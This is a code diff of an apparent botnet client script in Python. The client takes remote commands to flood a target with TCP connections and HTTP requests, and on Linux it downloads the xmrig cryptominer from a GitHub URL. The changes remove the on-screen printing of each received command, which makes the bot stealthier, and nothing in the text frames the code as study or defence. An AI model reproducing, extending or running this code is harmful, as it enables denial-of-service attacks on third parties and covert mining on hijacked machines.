@@ -1,7 +1,7 @@
-import sys
 import threading
 import requests
 import socket
+import sys
 import os
 
 host = "127.0.0.1"
@@ -27,8 +27,6 @@ def client():
                 tcp_threads = int(data[3])
 
                 data = " ".join(data)
-
-                print(f"\033[31m! {data} !\033[0m")
 
                 tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 tcp_sock.connect((tcp_ip, tcp_port))
@@ -90,8 +88,6 @@ def client():
 
                 data = " ".join(data)
 
-                print(f"\033[31m! {data} !\033[0m")
-
                 response = requests.get(req_url)
 
                 def req():
@@ -119,8 +115,6 @@ def client():
                 worker = data[3]
 
                 data = " ".join(data)
-
-                print(f"\033[31m! {data} !\033[0m")
 
                 if sys.platform == "linux":
                     url = "https://github.com/rxyzqc/SC/raw/main/xmrig"
